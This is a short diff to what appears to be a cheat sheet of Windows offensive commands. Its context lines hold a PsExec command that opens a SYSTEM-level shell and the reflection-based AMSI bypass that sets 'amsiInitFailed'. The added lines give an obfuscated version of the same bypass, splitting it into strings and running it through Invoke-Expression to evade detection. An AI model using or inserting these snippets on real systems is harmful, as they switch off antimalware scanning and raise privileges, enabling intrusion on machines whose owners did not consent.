@@ -138,3 +138,7 @@ PsExec.exe" -accepteula -s %COMSPEC% /c whoami
 
 
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+$a = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
+$b = 'GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
+Invoke-Expression "$a::$b"
